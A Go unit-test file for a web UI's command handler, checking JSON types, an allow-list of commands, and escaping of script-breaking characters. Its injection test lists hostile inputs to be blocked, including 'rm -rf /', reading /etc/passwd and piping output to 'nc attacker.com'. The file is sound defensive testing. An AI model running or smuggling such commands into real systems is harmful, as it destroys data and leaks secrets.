package ui

import (
	"encoding/json"
	"strings"
	"testing"
)

// =============================================================================
// Request/Response Type Tests
// =============================================================================

func TestExecRequestJSON(t *testing.T) {
	t.Parallel()

	req := ExecRequest{Command: "email list"}
	data, err := json.Marshal(req)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ExecRequest
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Command != req.Command {
		t.Errorf("Expected command %q, got %q", req.Command, decoded.Command)
	}
}

func TestExecResponseJSON(t *testing.T) {
	t.Parallel()

	resp := ExecResponse{Output: "test output", Error: ""}
	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ExecResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Output != resp.Output {
		t.Errorf("Expected output %q, got %q", resp.Output, decoded.Output)
	}
}

func TestConfigStatusResponseJSON(t *testing.T) {
	t.Parallel()

	resp := ConfigStatusResponse{
		Configured:   true,
		Region:       "us",
		ClientID:     "test-client",
		HasAPIKey:    true,
		GrantCount:   2,
		DefaultGrant: "grant-123",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ConfigStatusResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Configured != resp.Configured {
		t.Errorf("Expected Configured %v, got %v", resp.Configured, decoded.Configured)
	}
	if decoded.GrantCount != resp.GrantCount {
		t.Errorf("Expected GrantCount %d, got %d", resp.GrantCount, decoded.GrantCount)
	}
}

// =============================================================================
// Security Tests
// =============================================================================

func TestCommandInjectionPrevention(t *testing.T) {
	t.Parallel()

	injectionAttempts := []string{
		"email list; rm -rf /",
		"email list && cat /etc/passwd",
		"email list | nc attacker.com 1234",
		"email list `whoami`",
		"email list $(whoami)",
		"email list\nrm -rf /",
		"email list\x00rm -rf /",
		"../../../etc/passwd",
		"email list --flag=$(cat /etc/passwd)",
	}

	for _, attempt := range injectionAttempts {
		t.Run(attempt[:min(20, len(attempt))], func(t *testing.T) {
			if isCommandAllowed(attempt) {
				t.Errorf("Injection attempt should be blocked: %q", attempt)
			}
		})
	}
}

func TestCommandWithFlagsAllowed(t *testing.T) {
	t.Parallel()

	// Commands with legitimate flags should be allowed
	legitimateCommands := []string{
		"email list --limit 10",
		"email list --unread --starred",
		"auth login --provider google",
		"calendar events list --days 7",
		"email folders list --id",
	}

	for _, cmd := range legitimateCommands {
		t.Run(cmd, func(t *testing.T) {
			if !isCommandAllowed(cmd) {
				t.Errorf("Legitimate command should be allowed: %q", cmd)
			}
		})
	}
}

// =============================================================================
// XSS Prevention Tests
// =============================================================================

func TestSafeJSJSON_EscapesDangerousSequences(t *testing.T) {
	t.Parallel()

	// Go's json.Marshal escapes <, >, & as unicode escape sequences
	// This prevents XSS when embedding JSON in HTML script tags
	tests := []struct {
		name     string
		input    any
		contains string // What the escaped output should contain
		excludes string // What should NOT appear unescaped
	}{
		{
			name:     "escapes script close tag",
			input:    map[string]string{"content": "</script>"},
			contains: `\u003c/script\u003e`, // < and > escaped
			excludes: "</script>",
		},
		{
			name:     "escapes HTML comment start",
			input:    map[string]string{"content": "<!--"},
			contains: `\u003c!--`, // < escaped
			excludes: "<!--",
		},
		{
			name:     "escapes greater than",
			input:    map[string]string{"content": "-->"},
			contains: `--\u003e`, // > escaped
			excludes: "-->",
		},
		{
			name:     "escapes ampersand",
			input:    map[string]string{"content": "&amp;"},
			contains: `\u0026amp;`, // & escaped
			excludes: "&amp;",
		},
		{
			name:     "normal content unchanged",
			input:    map[string]string{"key": "value"},
			contains: `"key":"value"`,
			excludes: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := string(safeJSJSON(tt.input))

			if tt.contains != "" && !strings.Contains(result, tt.contains) {
				t.Errorf("Expected result to contain %q, got: %s", tt.contains, result)
			}

			if tt.excludes != "" && strings.Contains(result, tt.excludes) {
				t.Errorf("Expected result to NOT contain %q, got: %s", tt.excludes, result)
			}
		})
	}
}

func TestSafeJSJSON_HandlesNil(t *testing.T) {
	t.Parallel()

	result := string(safeJSJSON(nil))
	if result != "null" {
		t.Errorf("Expected 'null', got: %s", result)
	}
}

func TestSafeJSJSON_HandlesPageData(t *testing.T) {
	t.Parallel()

	data := PageData{
		Grants: []Grant{
			{ID: "test-id", Email: "test@example.com", Provider: "google"},
		},
	}

	result := string(data.GrantsJSON())

	if !strings.Contains(result, "test@example.com") {
		t.Errorf("Expected result to contain email, got: %s", result)
	}

	// Ensure dangerous characters are escaped (< becomes \u003c)
	if strings.Contains(result, "<") || strings.Contains(result, ">") {
		t.Errorf("Result should not contain unescaped < or >: %s", result)
	}
}

func TestSafeJSJSON_HandlesError(t *testing.T) {
	t.Parallel()

	// Create an unmarshalable value (channel)
	ch := make(chan int)
	result := string(safeJSJSON(ch))

	if result != "null" {
		t.Errorf("Expected 'null' for unmarshalable value, got: %s", result)
	}
}

// =============================================================================
